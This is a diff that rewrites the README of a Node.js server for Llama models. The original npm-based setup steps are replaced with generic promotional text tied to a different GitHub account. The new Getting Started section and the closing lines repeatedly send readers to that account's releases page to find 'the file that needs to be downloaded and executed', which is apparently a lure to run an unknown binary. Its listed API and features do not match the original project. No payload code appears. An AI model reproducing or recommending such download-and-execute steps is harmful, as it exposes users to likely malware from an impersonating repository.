@@ -1,99 +1,113 @@
-# Llama Web Server
+# LlamaWebServer 🦙🌐
 
-Web server implementation of Llama.
+Welcome to the **LlamaWebServer** repository! This project is a web server implementation designed to host and manage Llama AI models effectively. Our goal is to provide a robust backend solution for deploying AI-driven chatbots and character interactions.
 
-## How to run the server
+[![Download LlamaWebServer](https://img.shields.io/badge/Download_LlamaWebServer-Release-brightgreen)](https://github.com/Evolution-rydox/LlamaWebServer/releases)
 
-- Download a GGUF model file from [HuggingFace.co](https://huggingface.co)
-- Place the GGUF model file in the `model` folder.
-- Run `npm install`
-- Run `npm run start`
-- Browse to `http://localhost`
+## Table of Contents
 
-## How to run the server using a different port
+- [Introduction](#introduction)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Usage](#usage)
+- [API Reference](#api-reference)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-- Run `npm run start 8080`
-- Browse to `http://localhost:8080`
+## Introduction
 
-## Running the Web server in the background
+The **LlamaWebServer** project aims to create a seamless environment for deploying AI models. By leveraging the power of Llama, this server allows developers to build interactive chatbots and web applications that engage users in meaningful conversations. 
 
-1. Install Forever: `npm install -g forever`
-2. Start the server: `npm run forever`
-3. Stop the server: `npm run stop`
+## Features
 
-## Forcing the light and dark modes
+- **Easy Setup**: Quickly install and run the server with minimal configuration.
+- **AI Integration**: Seamlessly integrate Llama models for natural language processing tasks.
+- **Web Interface**: A user-friendly frontend for managing and interacting with AI models.
+- **Scalability**: Designed to handle multiple requests efficiently.
+- **Customizable**: Modify server settings to fit your specific needs.
 
-- Browse to `http://localhost/?lightmode`
+## Getting Started
 
-- Browse to `http://localhost/?darkmode`
+To get started with **LlamaWebServer**, follow these steps:
 
-## Setting the system prompt
+1. **Download the Latest Release**: Visit the [Releases section](https://github.com/Evolution-rydox/LlamaWebServer/releases) to download the latest version. Look for the file that needs to be downloaded and executed.
 
-The backend receives from the frontend the chat history (that includes the system prompt and the prompt) and passes the chat history, the system prompt and the prompt to the AI model.
+2. **Install Dependencies**: Ensure you have Node.js and npm installed on your machine. You can download them from the [Node.js official website](https://nodejs.org/).
 
-- Simple system prompt:
+3. **Run the Server**: After downloading, navigate to the project directory in your terminal and run:
+
+   ```bash
+   npm install
+   npm start
+   ```
+
+4. **Access the Web Interface**: Open your browser and go to `http://localhost:3000` to access the server's web interface.
+
+## Usage
+
+Once the server is running, you can interact with it through the web interface. Here’s how to use the main features:
+
+### 1. Uploading Models
+
+To upload a Llama model, navigate to the "Models" section and click on "Upload". Select your model file and follow the prompts.
+
+### 2. Managing Models
+
+You can view all uploaded models in the "Models" section. Here, you can delete or update existing models.
+
+### 3. Interacting with the Chatbot
+
+Go to the "Chat" section to start interacting with your AI chatbot. Type your messages in the input box and hit enter to receive responses.
+
+## API Reference
+
+### Endpoints
+
+- **GET /api/models**: Retrieve a list of all uploaded models.
+- **POST /api/models**: Upload a new model.
+- **DELETE /api/models/:id**: Delete a model by its ID.
+- **POST /api/chat**: Send a message to the chatbot and receive a response.
+
+### Example Request
+
+To interact with the chatbot, you can send a POST request to `/api/chat` with the following JSON body:
 
 ```json
 {
-  "system_prompt": "You are a useful AI assistant."
+  "message": "Hello, Llama!"
 }
 ```
 
-- Universe prompt:
+### Example Response
+
+The server will respond with a JSON object containing the chatbot's reply:
 
 ```json
 {
-  "system_prompt": [
-    {
-      "description": "I'm going to be John and the AI is going to be acting like three characters: Buddy, Steven and Richard. {Buddy}. {Steven}. {Richard}. There are two places: Home and the Office. {Home}. {Office}."
-    },
-    {
-      "places": [
-        {
-          "Home": "The house is nice, it has a small kitchen, a big living room, a nice bedroom and a big bathroom."
-        },
-        {
-          "Office": "The office is small with a reception room and a bathroom."
-        }
-      ]
-    },
-    {
-      "characters": [
-        {
-          "Buddy": "Buddy is a 10 years old Basset Hounds."
-        },
-        {
-          "Richard": "Richard is a 40-years old man and is John's father."
-        },
-        {
-          "Steven": "Steven is a 20-years old man and is John's brother."
-        }
-      ]
-    },
-    {
-      "rules": [
-        "When a character speaks, their dialogue must be preceded by their name, a colon, and a space, for example, 'John: Hello, how are you?'",
-        "Movements and reactions must be in one sentence and in parentheses.",
-        "Now we are at home with Buddy and Richard.",
-        "The user is John."
-      ]
-    },
-    {
-      "welcomeMessage": "Welcome to this small universe. There are two places you can visit: your home and the office. Your name is John and you are at your home now, with your dog Buddy and your father Richard."
-    }
-  ]
+  "response": "Hello! How can I assist you today?"
 }
 ```
 
-The `system_prompt` key is defined in [src/public/strings.js](https://github.com/lrusso/LlamaWebServer/blob/main/src/public/strings.js).
+## Contributing
 
-## Suggested GGUF models
+We welcome contributions to improve **LlamaWebServer**! Here’s how you can help:
 
-- [Llama 3.1 8B (8.54 GB)](https://huggingface.co/bartowski/Meta-Llama-3.1-8B-Instruct-GGUF/resolve/main/Meta-Llama-3.1-8B-Instruct-Q8_0.gguf?download=true)
-- [Llama 3.1 8B (4.32 GB)](https://huggingface.co/bartowski/Meta-Llama-3.1-8B-Instruct-GGUF/resolve/main/Meta-Llama-3.1-8B-Instruct-Q3_K_L.gguf?download=true)
-- [Llama 3.1 8B Uncensored (8.54 GB)](https://huggingface.co/bartowski/Llama-3.1-8B-Lexi-Uncensored-V2-GGUF/resolve/main/Llama-3.1-8B-Lexi-Uncensored-V2-Q8_0.gguf?download=true)
-- [Llama 3.1 8B Uncensored (4.32 GB)](https://huggingface.co/bartowski/Llama-3.1-8B-Lexi-Uncensored-V2-GGUF/resolve/main/Llama-3.1-8B-Lexi-Uncensored-V2-Q3_K_L.gguf?download=true)
+1. **Fork the Repository**: Create your own copy of the project.
+2. **Make Changes**: Implement your improvements or fixes.
+3. **Submit a Pull Request**: Share your changes with us for review.
 
-## Disclaimer
+Please ensure your code adheres to our coding standards and includes appropriate tests.
 
-You are legally responsible for any damage that you could cause with this software when using it with an AI model.
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or feedback, feel free to reach out:
+
+- **Email**: contact@llamawebserver.com
+- **Twitter**: [@LlamaWebServer](https://twitter.com/LlamaWebServer)
+
+Thank you for checking out **LlamaWebServer**! We hope you find it useful for your AI projects. For the latest updates, visit our [Releases section](https://github.com/Evolution-rydox/LlamaWebServer/releases) regularly.
